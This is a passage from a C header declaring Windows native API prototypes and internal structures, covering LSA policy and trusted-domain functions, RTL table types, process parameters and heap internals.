	OUT PLSA_UNICODE_STRING *UserRights,
	OUT PULONG CountOfRights
	);

NTSTATUS
NTAPI
LsaAddAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
	IN PLSA_UNICODE_STRING UserRights,
	IN ULONG CountOfRights
	);

NTSTATUS
NTAPI
LsaRemoveAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
	IN BOOLEAN AllRights,
	IN LSA_UNICODE_STRING UserRights,
	IN ULONG CountOfRights
	);

///////////////////////////////////////////////////////////////////////////////
//                                                                           //
// Local Security Policy - Trusted Domain Object API function prototypes     //
//                                                                           //
///////////////////////////////////////////////////////////////////////////////

NTSTATUS
NTAPI
LsaOpenTrustedDomainByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE TrustedDomainHandle
	);

NTSTATUS
NTAPI
LsaQueryTrustedDomainInfo(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetTrustedDomainInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaDeleteTrustedDomain(
	IN LSA_HANDLE PolicyHandle,
	IN PSID TrustedDomainSid
	);

NTSTATUS
NTAPI
LsaQueryTrustedDomainInfoByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetTrustedDomainInfoByName(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN TRUSTED_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaEnumerateTrustedDomainsEx(
	IN LSA_HANDLE PolicyHandle,
	IN OUT PLSA_ENUMERATION_HANDLE EnumerationContext,
	OUT PVOID *Buffer,
	IN ULONG PreferedMaximumLength,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaCreateTrustedDomainEx(
	IN LSA_HANDLE PolicyHandle,
	IN PTRUSTED_DOMAIN_INFORMATION_EX TrustedDomainInformation,
	IN PTRUSTED_DOMAIN_AUTH_INFORMATION AuthenticationInformation,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE TrustedDomainHandle
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
NTAPI
LsaQueryForestTrustInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	OUT PLSA_FOREST_TRUST_INFORMATION * ForestTrustInfo
	);

NTSTATUS
NTAPI
LsaSetForestTrustInformation(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING TrustedDomainName,
	IN PLSA_FOREST_TRUST_INFORMATION ForestTrustInfo,
	IN BOOLEAN CheckOnly,
	OUT PLSA_FOREST_TRUST_COLLISION_INFORMATION * CollisionInfo
	);

// #define TESTING_MATCHING_ROUTINE
#ifdef TESTING_MATCHING_ROUTINE

NTSTATUS
NTAPI
LsaForestTrustFindMatch(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Type,
	IN PLSA_UNICODE_STRING Name,
	OUT PLSA_UNICODE_STRING * Match
	);

#endif
#endif

//
// This API sets the workstation password (equivalent of setting/getting
// the SSI_SECRET_NAME secret)
//

NTSTATUS
NTAPI
LsaStorePrivateData(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING KeyName,
	IN OPTIONAL PLSA_UNICODE_STRING PrivateData
	);

NTSTATUS
NTAPI
LsaRetrievePrivateData(
	IN LSA_HANDLE PolicyHandle,
	IN PLSA_UNICODE_STRING KeyName,
	OUT PLSA_UNICODE_STRING * PrivateData
	);


ULONG
NTAPI
LsaNtStatusToWinError(
	IN NTSTATUS Status
	);

#endif // _NTLSA_IFS_
// 04.06.2011 - end

//
// Driver entry management APIs.
//

typedef struct _EFI_DRIVER_ENTRY {
	ULONG Version;
	ULONG Length;
	ULONG Id;
	ULONG FriendlyNameOffset;
	ULONG DriverFilePathOffset;
	//WCHAR FriendlyName[ANYSIZE_ARRAY];
	//FILE_PATH DriverFilePath;
} EFI_DRIVER_ENTRY, *PEFI_DRIVER_ENTRY;

typedef struct _EFI_DRIVER_ENTRY_LIST {
	ULONG NextEntryOffset;
	EFI_DRIVER_ENTRY DriverEntry;
} EFI_DRIVER_ENTRY_LIST, *PEFI_DRIVER_ENTRY_LIST;

#define EFI_DRIVER_ENTRY_VERSION 1
#define MAX_STACK_DEPTH 32

typedef struct _RTL_STACK_CONTEXT_ENTRY {
	ULONG_PTR Address; // stack address
	ULONG_PTR Data;    // stack contents
} RTL_STACK_CONTEXT_ENTRY, * PRTL_STACK_CONTEXT_ENTRY;

typedef struct _RTL_STACK_CONTEXT {
	ULONG NumberOfEntries;
	RTL_STACK_CONTEXT_ENTRY Entry[1];
} RTL_STACK_CONTEXT, * PRTL_STACK_CONTEXT;

typedef NTSTATUS
	(NTAPI * PRTL_HEAP_COMMIT_ROUTINE)(
	IN PVOID Base,
	IN OUT PVOID *CommitAddress,
	IN OUT PSIZE_T CommitSize
	);

typedef struct _RTL_HEAP_PARAMETERS
{
	ULONG Length;
	SIZE_T SegmentReserve;
	SIZE_T SegmentCommit;
	SIZE_T DeCommitFreeBlockThreshold;
	SIZE_T DeCommitTotalFreeThreshold;
	SIZE_T MaximumAllocationSize;
	SIZE_T VirtualMemoryThreshold;
	SIZE_T InitialCommit;
	SIZE_T InitialReserve;
	PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;
	SIZE_T Reserved[2];
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

#define HEAP_SETTABLE_USER_VALUE 0x00000100
#define HEAP_SETTABLE_USER_FLAG1 0x00000200
#define HEAP_SETTABLE_USER_FLAG2 0x00000400
#define HEAP_SETTABLE_USER_FLAG3 0x00000800
#define HEAP_SETTABLE_USER_FLAGS 0x00000e00

#define HEAP_CLASS_0 0x00000000 // Process heap
#define HEAP_CLASS_1 0x00001000 // Private heap
#define HEAP_CLASS_2 0x00002000 // Kernel heap
#define HEAP_CLASS_3 0x00003000 // GDI heap
#define HEAP_CLASS_4 0x00004000 // User heap
#define HEAP_CLASS_5 0x00005000 // Console heap
#define HEAP_CLASS_6 0x00006000 // User desktop heap
#define HEAP_CLASS_7 0x00007000 // CSR shared heap
#define HEAP_CLASS_8 0x00008000 // CSR port heap
#define HEAP_CLASS_MASK 0x0000f000

struct _RTL_AVL_TABLE;

typedef struct _RTL_SPLAY_LINKS {
	struct _RTL_SPLAY_LINKS *Parent;
	struct _RTL_SPLAY_LINKS *LeftChild;
	struct _RTL_SPLAY_LINKS *RightChild;
} RTL_SPLAY_LINKS;
typedef RTL_SPLAY_LINKS *PRTL_SPLAY_LINKS;

typedef enum _TABLE_SEARCH_RESULT
{
	TableEmptyTree,
	TableFoundNode,
	TableInsertAsLeft,
	TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS
{
	GenericLessThan,
	GenericGreaterThan,
	GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

struct _RTL_AVL_TABLE;

typedef RTL_GENERIC_COMPARE_RESULTS (NTAPI *PRTL_AVL_COMPARE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN PVOID FirstStruct,
	IN PVOID SecondStruct
	);

typedef PVOID (NTAPI *PRTL_AVL_ALLOCATE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN CLONG ByteSize
	);

typedef VOID (NTAPI *PRTL_AVL_FREE_ROUTINE)(
	IN struct _RTL_AVL_TABLE *Table,
	IN	PVOID Buffer
	);

typedef NTSTATUS (NTAPI *PRTL_AVL_MATCH_FUNCTION)(
	IN struct _RTL_AVL_TABLE *Table,
	IN PVOID UserData,
	IN PVOID MatchData
	);

typedef
	RTL_GENERIC_COMPARE_RESULTS
	(NTAPI *PRTL_AVL_COMPARE_ROUTINE) (
	struct _RTL_AVL_TABLE *Table,
	PVOID FirstStruct,
	PVOID SecondStruct
	);

typedef
	PVOID
	(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE) (
	struct _RTL_AVL_TABLE *Table,
	ULONG ByteSize
	);


typedef
	NTSTATUS
	(NTAPI *PRTL_AVL_MATCH_FUNCTION) (
	struct _RTL_AVL_TABLE *Table,
	PVOID UserData,
	PVOID MatchData
	);

typedef
	RTL_GENERIC_COMPARE_RESULTS
	(NTAPI *PRTL_GENERIC_COMPARE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	PVOID FirstStruct,
	PVOID SecondStruct
	);

typedef
	PVOID
	(NTAPI *PRTL_GENERIC_ALLOCATE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	ULONG ByteSize
	);

typedef
	VOID
	(NTAPI *PRTL_GENERIC_FREE_ROUTINE) (
	struct _RTL_GENERIC_TABLE *Table,
	PVOID Buffer
	);

typedef struct _RTL_BALANCED_LINKS
{
	struct _RTL_BALANCED_LINKS *Parent;
	struct _RTL_BALANCED_LINKS *LeftChild;
	struct _RTL_BALANCED_LINKS *RightChild;
	CHAR Balance;
	UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE
{
	RTL_BALANCED_LINKS BalancedRoot;
	PVOID OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	ULONG DepthOfTree;
	PRTL_BALANCED_LINKS RestartKey;
	ULONG DeleteCount;
	PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
	PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
	PRTL_AVL_FREE_ROUTINE FreeRoutine;
	PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

typedef struct _RTL_GENERIC_TABLE {
	PRTL_SPLAY_LINKS TableRoot;
	LIST_ENTRY InsertOrderList;
	PLIST_ENTRY OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;
	PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;
	PRTL_GENERIC_FREE_ROUTINE FreeRoutine;
	PVOID TableContext;
} RTL_GENERIC_TABLE;
typedef RTL_GENERIC_TABLE *PRTL_GENERIC_TABLE;

typedef struct _GENERATE_NAME_CONTEXT {

	USHORT Checksum;
	BOOLEAN ChecksumInserted;

	UCHAR NameLength;         // not including extension
	WCHAR NameBuffer[8];      // e.g., "ntoskrnl"

	ULONG ExtensionLength;    // including dot
	WCHAR ExtensionBuffer[4]; // e.g., ".exe"

	ULONG LastIndexValue;

} GENERATE_NAME_CONTEXT;
typedef GENERATE_NAME_CONTEXT *PGENERATE_NAME_CONTEXT;

typedef struct _PREFIX_TABLE_ENTRY {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	struct _PREFIX_TABLE_ENTRY *NextPrefixTree;
	RTL_SPLAY_LINKS Links;
	PSTRING Prefix;
} PREFIX_TABLE_ENTRY;
typedef PREFIX_TABLE_ENTRY *PPREFIX_TABLE_ENTRY;

typedef struct _PREFIX_TABLE {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	PPREFIX_TABLE_ENTRY NextPrefixTree;
} PREFIX_TABLE;
typedef PREFIX_TABLE *PPREFIX_TABLE;

typedef struct _UNICODE_PREFIX_TABLE_ENTRY {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	struct _UNICODE_PREFIX_TABLE_ENTRY *NextPrefixTree;
	struct _UNICODE_PREFIX_TABLE_ENTRY *CaseMatch;
	RTL_SPLAY_LINKS Links;
	PUNICODE_STRING Prefix;
} UNICODE_PREFIX_TABLE_ENTRY;
typedef UNICODE_PREFIX_TABLE_ENTRY *PUNICODE_PREFIX_TABLE_ENTRY;

typedef struct _UNICODE_PREFIX_TABLE {
	CSHORT NodeTypeCode;
	CSHORT NameLength;
	PUNICODE_PREFIX_TABLE_ENTRY NextPrefixTree;
	PUNICODE_PREFIX_TABLE_ENTRY LastNextEntry;
} UNICODE_PREFIX_TABLE;
typedef UNICODE_PREFIX_TABLE *PUNICODE_PREFIX_TABLE;

#define COMPRESSION_FORMAT_NONE          (0x0000)   // winnt
#define COMPRESSION_FORMAT_DEFAULT       (0x0001)   // winnt
#define COMPRESSION_FORMAT_LZNT1         (0x0002)   // winnt

#define COMPRESSION_ENGINE_STANDARD      (0x0000)   // winnt
#define COMPRESSION_ENGINE_MAXIMUM       (0x0100)   // winnt
#define COMPRESSION_ENGINE_HIBER         (0x0200)   // winnt

typedef struct _COMPRESSED_DATA_INFO {

	USHORT CompressionFormatAndEngine;

	UCHAR CompressionUnitShift;
	UCHAR ChunkShift;
	UCHAR ClusterShift;
	UCHAR Reserved;
	USHORT NumberOfChunks;
	ULONG CompressedChunkSizes[ANYSIZE_ARRAY];

} COMPRESSED_DATA_INFO;
typedef COMPRESSED_DATA_INFO *PCOMPRESSED_DATA_INFO;

typedef struct _SECTION_IMAGE_INFORMATION {
	PVOID TransferAddress;
	ULONG ZeroBits;
	UCHAR Alignment[4];
	SIZE_T MaximumStackSize;
	SIZE_T CommittedStackSize;
	ULONG SubSystemType;
	union {
		struct {
			USHORT SubSystemMinorVersion;
			USHORT SubSystemMajorVersion;
		};
		ULONG SubSystemVersion;
	};
	ULONG GpValue;
	USHORT ImageCharacteristics;
	USHORT DllCharacteristics;
	USHORT Machine;
	BOOLEAN ImageContainsCode;
	union
	{
		UCHAR	ImageFlags;
		struct 
		{
			BOOLEAN ComPlusNativeReady : 1;
			BOOLEAN ComPlusILOnly : 1;
			BOOLEAN ImageDynamicallyRelocated : 1;
			BOOLEAN ImageMappedFlat : 1;
			BOOLEAN Reserved : 4;
		};
	};

	ULONG LoaderFlags;
	ULONG ImageFileSize;
	ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION64 {
	ULONGLONG TransferAddress;
	ULONG ZeroBits;
	ULONGLONG MaximumStackSize;
	ULONGLONG CommittedStackSize;
	ULONG SubSystemType;
	union {
		struct {
			USHORT SubSystemMinorVersion;
			USHORT SubSystemMajorVersion;
		};
		ULONG SubSystemVersion;
	};
	ULONG GpValue;
	USHORT ImageCharacteristics;
	USHORT DllCharacteristics;
	USHORT Machine;
	BOOLEAN ImageContainsCode;
	BOOLEAN Spare1;
	ULONG LoaderFlags;
	ULONG ImageFileSize;
	ULONG Reserved[ 1 ];
} SECTION_IMAGE_INFORMATION64, *PSECTION_IMAGE_INFORMATION64;

typedef struct _RTL_BITMAP {
	ULONG SizeOfBitMap;
	UCHAR Padding[4];
	PULONG Buffer;
} RTL_BITMAP;
typedef RTL_BITMAP *PRTL_BITMAP;

#define RTL_USER_PROC_CURDIR_CLOSE      0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT    0x00000003

#define RTL_RANGE_SHARED    0x01
#define RTL_RANGE_CONFLICT  0x02

typedef struct _RTL_RANGE_LIST {
	LIST_ENTRY ListHead;
	ULONG Flags;        // use RANGE_LIST_FLAG_*
	ULONG Count;
	ULONG Stamp;
} RTL_RANGE_LIST, *PRTL_RANGE_LIST;

typedef enum {
	RtlBsdItemVersionNumber = 0x00,
	RtlBsdItemProductType,
	RtlBsdItemAabEnabled,
	RtlBsdItemAabTimeout,
	RtlBsdItemBootGood,
	RtlBsdItemBootShutdown,
	RtlBsdItemMax
} RTL_BSD_ITEM_TYPE, *PRTL_BSD_ITEM_TYPE;

typedef struct _RANGE_LIST_ITERATOR {
	PLIST_ENTRY RangeListHead;
	PLIST_ENTRY MergedHead;
	PVOID Current;
	ULONG Stamp;
} RTL_RANGE_LIST_ITERATOR, *PRTL_RANGE_LIST_ITERATOR;

typedef struct _STARTUP_ARGUMENT
{
	//ULONG Unknown[ 3 ];
	UNICODE_STRING Unknown[ 3 ];
	PRTL_USER_PROCESS_PARAMETERS Environment;
} STARTUP_ARGUMENT, *PSTARTUP_ARGUMENT;

#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_USER_PROC_PROFILE_USER          0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL        0x00000004
#define RTL_USER_PROC_PROFILE_SERVER        0x00000008
#define RTL_USER_PROC_RESERVE_1MB           0x00000020
#define RTL_USER_PROC_RESERVE_16MB          0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE        0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT  0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING     0x00004000
#define RTL_USER_PROC_OPTIN_PROCESS         0x00020000

typedef NTSTATUS (*PUSER_PROCESS_START_ROUTINE)(
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters
	);

typedef NTSTATUS (*PUSER_THREAD_START_ROUTINE)(
	PVOID ThreadParameter
	);

typedef struct _RTL_USER_PROCESS_INFORMATION {
	ULONG Length;
	HANDLE Process;
	HANDLE Thread;
	CLIENT_ID ClientId;
	SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

typedef struct _RTL_USER_PROCESS_INFORMATION64 {
	ULONG Length;
	LONGLONG Process;
	LONGLONG Thread;
	CLIENT_ID64 ClientId;
	SECTION_IMAGE_INFORMATION64 ImageInformation;
} RTL_USER_PROCESS_INFORMATION64, *PRTL_USER_PROCESS_INFORMATION64;

#define RTL_TRACE_IN_USER_MODE       0x00000001
#define RTL_TRACE_IN_KERNEL_MODE     0x00000002
#define RTL_TRACE_USE_NONPAGED_POOL  0x00000004
#define RTL_TRACE_USE_PAGED_POOL     0x00000008

typedef struct _RTL_RESOURCE {

	RTL_CRITICAL_SECTION CriticalSection;

	HANDLE SharedSemaphore;
	ULONG NumberOfWaitingShared;
	HANDLE ExclusiveSemaphore;
	ULONG NumberOfWaitingExclusive;

	LONG NumberOfActive;
	HANDLE ExclusiveOwnerThread;

	ULONG Flags;        // See RTL_RESOURCE_FLAG_ equates below.

	PRTL_RESOURCE_DEBUG DebugInfo;
} RTL_RESOURCE, *PRTL_RESOURCE;

#define RTL_RESOURCE_FLAG_LONG_TERM     ((ULONG) 0x00000001)

typedef struct _RTL_TRACE_BLOCK {
	ULONG Magic;
	ULONG Count;
	ULONG Size;

	SIZE_T UserCount;
	SIZE_T UserSize;
	PVOID UserContext;

	struct _RTL_TRACE_BLOCK * Next;
	PVOID * Trace;
} RTL_TRACE_BLOCK, * PRTL_TRACE_BLOCK;

typedef ULONG (* RTL_TRACE_HASH_FUNCTION) (ULONG Count, PVOID * Trace);
typedef struct _RTL_TRACE_DATABASE * PRTL_TRACE_DATABASE;

typedef struct _RTL_TRACE_ENUMERATE {
	PRTL_TRACE_DATABASE Database;
	ULONG Index;
	PRTL_TRACE_BLOCK Block;
} RTL_TRACE_ENUMERATE, * PRTL_TRACE_ENUMERATE;

typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	PVOID GpValue;
	struct _NON_PAGED_DEBUG_INFO* NonPagedDebugInfo;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	ULONG CoverageSectionSize;
	PVOID CoverageSection;
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;	// <size 0x54>

#define RTL_HEAP_BUSY               (USHORT)0x0001
#define RTL_HEAP_SEGMENT            (USHORT)0x0002
#define RTL_HEAP_SETTABLE_VALUE     (USHORT)0x0010
#define RTL_HEAP_SETTABLE_FLAG1     (USHORT)0x0020
#define RTL_HEAP_SETTABLE_FLAG2     (USHORT)0x0040
#define RTL_HEAP_SETTABLE_FLAG3     (USHORT)0x0080
#define RTL_HEAP_SETTABLE_FLAGS     (USHORT)0x00E0
#define RTL_HEAP_UNCOMMITTED_RANGE  (USHORT)0x0100
#define RTL_HEAP_PROTECTED_ENTRY    (USHORT)0x0200

#pragma warning(disable: 4273) // nconsistent dll linkage (winnt.h)

typedef struct _DISPATCHER_HEADER
{
	union
	{
		struct
		{
			UCHAR Type;
			union
			{
				UCHAR Absolute;
				UCHAR NpxIrql;
			};

			union
			{
				UCHAR Size;
				UCHAR Hand;
			};

			union
			{
				UCHAR Inserted;
				BOOLEAN DebugActive;
			};

		};	// struct ..
		volatile LONG Lock;
	};	// first union ..

	LONG SignalState;
	LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;

typedef struct _KEVENT
{
	DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT, *PRKEVENT;

typedef struct _KGATE
{
	DISPATCHER_HEADER Header;
} KGATE, *PKGATE;

typedef struct _KSEMAPHORE
{
	DISPATCHER_HEADER Header;
	LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE;		// <size 0x14>

typedef struct _OWNER_ENTRY
{
	ULONG OwnerThread;
	LONG OwnerCount;
	ULONG TableSize;
} OWNER_ENTRY, *POWNER_ENTRY;		// <size 0x8>

typedef struct _ERESOURCE
{
	LIST_ENTRY SystemResourcesList;
	OWNER_ENTRY* OwnerTable;
	SHORT ActiveCount;
	USHORT Flag;
	KSEMAPHORE* SharedWaiters;
	KEVENT* ExclusiveWaiters;
	OWNER_ENTRY OwnerEntry;
	ULONG ActiveEntries;
	ULONG ContentionCount;
	ULONG NumberOfSharedWaiters;
	ULONG NumberOfExclusiveWaiters;
	PVOID Address;
	ULONG CreatorBackTraceIndex;
	ULONG SpinLock;
} ERESOURCE, *PERESOURCE;		// <size 0x38>

#define SET_LAST_STATUS(S)NtCurrentTeb()->LastErrorValue = RtlNtStatusToDosError(NtCurrentTeb()->LastStatusValue = (ULONG)(S))

#define HEAP_GRANULARITY            (sizeof( HEAP_ENTRY ))
#define HEAP_GRANULARITY_SHIFT      3

#define HEAP_MAXIMUM_BLOCK_SIZE     (USHORT)(((0x10000 << HEAP_GRANULARITY_SHIFT) - PAGE_SIZE) >> HEAP_GRANULARITY_SHIFT)

#define HEAP_MAXIMUM_FREELISTS 128
#define HEAP_MAXIMUM_SEGMENTS 16

#define HEAP_ENTRY_BUSY             0x01
#define HEAP_ENTRY_EXTRA_PRESENT    0x02
#define HEAP_ENTRY_FILL_PATTERN     0x04
#define HEAP_ENTRY_VIRTUAL_ALLOC    0x08
#define HEAP_ENTRY_LAST_ENTRY       0x10
#define HEAP_ENTRY_SETTABLE_FLAG1   0x20
#define HEAP_ENTRY_SETTABLE_FLAG2   0x40
#define HEAP_ENTRY_SETTABLE_FLAG3   0x80
#define HEAP_ENTRY_SETTABLE_FLAGS   0xE0

typedef struct _HEAP_LOCK
{
	union
	{
		RTL_CRITICAL_SECTION CriticalSection;
		ERESOURCE Resource;
	} Lock;
} HEAP_LOCK, *PHEAP_LOCK;

typedef struct _HEAP_TUNING_PARAMETERS
{
	ULONG CommittThresholdShift;
	ULONG MaxPreCommittThreshold;
} HEAP_TUNING_PARAMETERS, *PHEAP_TUNING_PARAMETERS;		// <size 0x8>

typedef struct _HEAP_PSEUDO_TAG_ENTRY
{
	ULONG Allocs;
	ULONG Frees;
	ULONG Size;
} HEAP_PSEUDO_TAG_ENTRY, *PHEAP_PSEUDO_TAG_ENTRY;	// <size 0xc>

typedef struct _HEAP_TAG_ENTRY
{
	ULONG Allocs;
	ULONG Frees;
	ULONG Size;
	USHORT TagIndex;
	USHORT CreatorBackTraceIndex;
	WCHAR TagName[ 24 ];
} HEAP_TAG_ENTRY, *PHEAP_TAG_ENTRY;		// <size 0x40>

typedef struct _HEAP_ENTRY
{
	USHORT Size;
	UCHAR Flags;
	UCHAR SmallTagIndex;
	PVOID SubSegmentCode;
	USHORT PreviousSize;
	UCHAR SegmentOffset;
	UCHAR LFHFlags;
	UCHAR UnusedBytes;
	USHORT FunctionIndex;
	USHORT ContextValue;
	ULONG InterceptorValue;
	USHORT UnusedBytesLength;
	UCHAR EntryOffset;
	UCHAR ExtendedBlockSignature;
	ULONG Code1;
	USHORT Code2;
	UCHAR Code3;
	UCHAR Code4;
	ULONG64 AgregateCode;
} HEAP_ENTRY, *PHEAP_ENTRY;

typedef struct _HEAP_COUNTERS
{
	ULONG TotalMemoryReserved;
	ULONG TotalMemoryCommitted;
	ULONG TotalMemoryLargeUCR;
	ULONG TotalSizeInVirtualBlocks;
	ULONG TotalSegments;
	ULONG TotalUCRs;
	ULONG CommittOps;
	ULONG DeCommitOps;
	ULONG LockAcquires;
	ULONG LockCollisions;
	ULONG CommitRate;
	ULONG DecommittRate;
	ULONG CommitFailures;
	ULONG InBlockCommitFailures;
	ULONG CompactHeapCalls;
	ULONG CompactedUCRs;
	ULONG InBlockDeccommits;
	ULONG InBlockDeccomitSize;
} HEAP_COUNTERS, *PHEAP_COUNTERS;		// <size 0x48>

typedef struct _HEAP
{
	HEAP_ENTRY Entry;
	ULONG SegmentSignature;
	ULONG SegmentFlags;
	LIST_ENTRY SegmentListEntry;
	struct _HEAP* Heap;
	PVOID BaseAddress;
	ULONG NumberOfPages;
	PHEAP_ENTRY FirstEntry;
	PHEAP_ENTRY LastValidEntry;
	ULONG NumberOfUnCommittedPages;
	ULONG NumberOfUnCommittedRanges;
	USHORT SegmentAllocatorBackTraceIndex;
	USHORT Reserved;
	LIST_ENTRY UCRSegmentList;
	ULONG Flags;
	ULONG ForceFlags;
	ULONG CompatibilityFlags;
	ULONG EncodeFlagMask;
	HEAP_ENTRY Encoding;
	ULONG PointerKey;
	ULONG Interceptor;
	ULONG VirtualMemoryThreshold;
	ULONG Signature;
	ULONG SegmentReserve;
	ULONG SegmentCommit;
	ULONG DeCommitFreeBlockThreshold;
	ULONG DeCommitTotalFreeThreshold;
	ULONG TotalFreeSize;
	ULONG MaximumAllocationSize;
	USHORT ProcessHeapsListIndex;
	USHORT HeaderValidateLength;
	PVOID HeaderValidateCopy;
	USHORT NextAvailableTagIndex;
	USHORT MaximumTagIndex;
	PHEAP_TAG_ENTRY TagEntries;
	LIST_ENTRY UCRList;
	ULONG AlignRound;
	ULONG AlignMask;
	LIST_ENTRY VirtualAllocdBlocks;
	LIST_ENTRY SegmentList;
	USHORT AllocatorBackTraceIndex;
	ULONG NonDedicatedListLength;
	PVOID BlocksIndex;
	PVOID UCRIndex;
	PHEAP_PSEUDO_TAG_ENTRY PseudoTagEntries;
	LIST_ENTRY FreeLists;
	PHEAP_LOCK LockVariable;
	LONG * CommitRoutine;		// <<-- http://www.nirsoft.net/kernel_struct/vista/HEAP.html
	PVOID FrontEndHeap;
	USHORT FrontHeapLockCount;
	UCHAR FrontEndHeapType;
	HEAP_COUNTERS Counters;
	HEAP_TUNING_PARAMETERS TuningParameters;
} HEAP, *PHEAP;		// <size 0x130>

typedef struct _HEAP_FREE_ENTRY_EXTRA
{
	USHORT TagIndex;
	USHORT FreeBackTraceIndex;
} HEAP_FREE_ENTRY_EXTRA, *PHEAP_FREE_ENTRY_EXTRA;		// <size 0x4>

typedef struct _HEAP_ENTRY_EXTRA
{
	USHORT AllocatorBackTraceIndex;
	USHORT TagIndex;
	ULONG Settable;
	ULONG64 ZeroInit;
} HEAP_ENTRY_EXTRA, *PHEAP_ENTRY_EXTRA;		// <size 0x8>

typedef struct _HEAP_VIRTUAL_ALLOC_ENTRY
{
	LIST_ENTRY Entry;
	HEAP_ENTRY_EXTRA ExtraStuff;
	ULONG CommitSize;
	ULONG ReserveSize;
	HEAP_ENTRY BusyBlock;
} HEAP_VIRTUAL_ALLOC_ENTRY, *PHEAP_VIRTUAL_ALLOC_ENTRY;		// <size 0x20>

//
// Known extended CPU state feature IDs
//

// #define XSTATE_LEGACY_FLOATING_POINT        0
// #define XSTATE_LEGACY_SSE                   1
// #define XSTATE_GSSE                         2
// 
// #define XSTATE_MASK_LEGACY_FLOATING_POINT   (1i64 << (XSTATE_LEGACY_FLOATING_POINT))
// #define XSTATE_MASK_LEGACY_SSE              (1i64 << (XSTATE_LEGACY_SSE))
// #define XSTATE_MASK_LEGACY                  (XSTATE_MASK_LEGACY_FLOATING_POINT | XSTATE_MASK_LEGACY_SSE)
// #define XSTATE_MASK_GSSE                    (1i64 << (XSTATE_GSSE))
// 
// #define MAXIMUM_XSTATE_FEATURES             64


typedef enum _HARDERROR_RESPONSE_OPTION
{
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem,
	OptionOkNoWait,
	OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE
{
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes,
	ResponseTryAgain,
	ResponseContinue
} HARDERROR_RESPONSE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE
{
